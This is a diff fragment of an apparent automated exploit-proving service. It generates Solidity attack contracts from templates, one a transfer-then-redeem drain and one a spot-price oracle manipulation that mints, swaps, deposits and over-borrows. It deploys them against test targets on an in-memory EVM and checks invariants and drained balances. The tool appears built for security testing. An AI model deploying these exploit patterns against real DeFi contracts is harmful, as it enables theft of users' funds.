+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        f"        t.{transfer}(address(0xdEaD), 1);\n"
+        f"        t.{redeem}(address(_t).balance);\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _oracle(findings):
+    faucet = _fn_name(findings, "oracle_faucet", "faucet")
+    swap = _fn_name(findings, "oracle_swap", "swapBorForCol")
+    deposit = _fn_name(findings, "oracle_deposit", "depositCollateral")
+    borrow = _fn_name(findings, "oracle_borrow", "borrow")
+    body = (
+        "// Strategy: spot-price oracle manipulation — mint free BOR from the\n"
+        "// faucet, swap it to drain COL reserves and spike the spot price, then\n"
+        "// deposit the received COL and borrow against the inflated valuation.\n"
+        "interface IERC20 {\n"
+        "    function approve(address s, uint256 a) external returns (bool);\n"
+        "    function balanceOf(address w) external view returns (uint256);\n"
+        "}\n"
+        "interface IPool {\n"
+        f"    function {swap}(uint256 borIn) external;\n"
+        "    function spotPrice() external view returns (uint256);\n"
+        "}\n"
+        "interface ITarget {\n"
+        "    function collateralToken() external view returns (address);\n"
+        "    function borrowToken() external view returns (address);\n"
+        "    function pool() external view returns (address);\n"
+        f"    function {faucet}() external;\n"
+        f"    function {deposit}(uint256 amount) external;\n"
+        f"    function {borrow}(uint256 amount) external;\n"
+        "    function collateralOf(address w) external view returns (uint256);\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget o = ITarget(_t);\n"
+        "        IERC20 col = IERC20(o.collateralToken());\n"
+        "        IERC20 bor = IERC20(o.borrowToken());\n"
+        "        address pool = o.pool();\n"
+        f"        for (uint256 i = 0; i < 5; i++) {{ o.{faucet}(); }}\n"
+        "        uint256 borBal = bor.balanceOf(address(this));\n"
+        "        bor.approve(pool, type(uint256).max);\n"
+        f"        IPool(pool).{swap}(borBal);\n"
+        "        uint256 colBal = col.balanceOf(address(this));\n"
+        "        col.approve(_t, type(uint256).max);\n"
+        f"        o.{deposit}(colBal);\n"
+        "        uint256 price = IPool(pool).spotPrice();\n"
+        "        uint256 value = (o.collateralOf(address(this)) * price) / 1e18;\n"
+        f"        o.{borrow}(value);\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+
+def _ensure_solc():
+    import solcx
+    os.makedirs(os.environ["SOLCX_BINARY_PATH"], exist_ok=True)
+    try:
+        solcx.install_solc(SOLC)  # idempotent; downloads to SOLCX_BINARY_PATH if missing
+    except Exception:
+        pass
+    solcx.set_solc_version(SOLC)
+
+def _coerce_args(args, Web3):
+    out = []
+    for a in args:
+        if isinstance(a, str):
+            if a.startswith("0x") and len(a) == 42:
+                out.append(Web3.to_checksum_address(a))
+            elif a.isdigit():
+                out.append(int(a))
+            else:
+                out.append(a)
+        else:
+            out.append(a)
+    return out
+
+def prove(name):
+    """Run the full pipeline on a fresh in-memory EVM and return step-by-step detail."""
+    import solcx
+    from web3 import Web3
+    from eth_tester import EthereumTester, PyEVMBackend
+    t0 = time.time()
+    data = TARGETS[name]
+    target_src, invariants_src, manifest = data["src"], data["inv"], data["manifest"]
+    steps = []
+
+    # 1) STATIC SCAN -> strategy
+    findings = scan_target(target_src, invariants_src, manifest)
+    order = seeded_order(sorted(STRATEGY_ORDER, key=lambda f: (-findings["scores"].get(f,0), f)),
+                         findings["scores"], 42)
+    chosen = None
+    exploit_src = None
+    for fam in order:
+        src = build_exploit(fam, findings)
+        if src:
+            chosen, exploit_src = fam, src
+            break
+    steps.append({"step":"scan","title":"정적 분석 · 전략 선택",
+                  "scores":findings["scores"],"strategy":chosen})
+    if not exploit_src:
+        return {"name":name,"proven":False,"firstViolated":"",
+                "strategy":None,"steps":steps,"exploit_src":None,
+                "note":"no known-pattern candidate (likely a safe target)","ms":int((time.time()-t0)*1000)}
+
+    steps.append({"step":"generate","title":"Exploit.sol 생성","strategy":chosen,
+                  "exploit_src":exploit_src})
+
+    # 2) compile target + invariants + exploit
+    _ensure_solc()
+    files = {f"{name}.sol":target_src, "Invariants.sol":invariants_src, "Exploit.sol":exploit_src}
+    std = {"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
+           "settings":{"evmVersion":EVM_VERSION,
+                       "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    compiled = solcx.compile_standard(std, allow_empty=True)
+    arts = {}
+    for _fn, cs in compiled.get("contracts",{}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
+
+    backend = PyEVMBackend.from_mnemonic(
+        "test test test test test test test test test test test junk",
+        genesis_state_overrides={"balance":10**24})
+    et = EthereumTester(backend=backend)
+    w3 = Web3(Web3.EthereumTesterProvider(et))
+    acct = w3.eth.accounts[0]
+
+    def deploy(art, args=None, value=0):
+        C = w3.eth.contract(abi=art["abi"], bytecode=art["bin"])
+        tx = C.constructor(*(args or [])).transact({"from":acct,"value":value,"gas":12_000_000})
+        r = w3.eth.wait_for_transaction_receipt(tx)
+        return w3.eth.contract(address=r.contractAddress, abi=art["abi"]), r.contractAddress
+
+    dep = manifest.get("deploy",{})
+    cargs = _coerce_args(dep.get("constructor_args",[]), Web3)
+    seed_wei = int(str(dep.get("value_wei","0")) or "0")
+
+    # 3) DEPLOY TARGET (Setup semantics: deploy{value: seed}(args))
+    target, taddr = deploy(arts[name], cargs, value=seed_wei)
+    inv, iaddr = deploy(arts["Invariants"])
+    before = inv.functions.checkAll(taddr).call()
+    bal_before = w3.eth.get_balance(taddr)
+    steps.append({"step":"deploy_target","title":"타깃 Foundry 배포 + 건강 검사",
+                  "address":taddr,"seed_wei":str(seed_wei),
+                  "balance_wei":str(bal_before),
+                  "checkAll_before":{"allHold":before[0],"firstViolated":before[1]}})
+    if before[0] is not True:
+        return {"name":name,"proven":False,"firstViolated":before[1],
+                "strategy":chosen,"steps":steps,"exploit_src":exploit_src,
+                "note":"BAD TARGET DESIGN","ms":int((time.time()-t0)*1000)}
+
+    # 4) DEPLOY + RUN EXPLOIT (fund 10 ETH, run{value:10 ether})
+    exp, eaddr = deploy(arts["Exploit"])
+    w3.eth.send_transaction({"from":acct,"to":eaddr,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":1_000_000})
+    run_err = None
+    try:
+        tx = exp.functions.run(taddr).transact({"from":acct,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":12_000_000})
+        w3.eth.wait_for_transaction_receipt(tx)
+    except Exception as e:
+        run_err = str(e)[:200]
+    steps.append({"step":"run_exploit","title":"Exploit 배포 + 실행",
+                  "exploit_address":eaddr,"run_error":run_err})
+
+    # 5) RE-CHECK
+    after = inv.functions.checkAll(taddr).call()
+    bal_after = w3.eth.get_balance(taddr)
+    proven = after[0] is False
+    steps.append({"step":"verify","title":"불변식 재검사",
+                  "checkAll_after":{"allHold":after[0],"firstViolated":after[1]},
+                  "balance_wei":str(bal_after),
+                  "drained_wei":str(bal_before - bal_after),
+                  "proven":proven})
+    return {"name":name,"proven":proven,"firstViolated":(after[1] if proven else ""),
+            "strategy":chosen,"exploit_src":exploit_src,"steps":steps,
+            "balance_before_wei":str(bal_before),"balance_after_wei":str(bal_after),
+            "ms":int((time.time()-t0)*1000)}
+
+def _run(name):
+    if name not in TARGETS:
+        return {"error":f"unknown target: {name}","targets":list(TARGETS.keys())}
+    try:
+        return prove(name)
+    except Exception as e:
+        return {"name":name,"error":str(e)[:400],"trace":traceback.format_exc()[-800:]}
+
+class handler(BaseHTTPRequestHandler):
+    def _send(self, code, obj):
+        body = json.dumps(obj, ensure_ascii=False).encode()
+        self.send_response(code)
+        self.send_header("Content-Type","application/json; charset=utf-8")
+        self.send_header("Access-Control-Allow-Origin","*")
+        self.send_header("Cache-Control","no-store")
+        self.end_headers()
+        self.wfile.write(body)
+    def do_GET(self):
+        q = parse_qs(urlparse(self.path).query)
+        name = (q.get("target") or [""])[0]
+        if not name:
+            return self._send(200, {"targets":list(TARGETS.keys())})
+        self._send(200, _run(name))
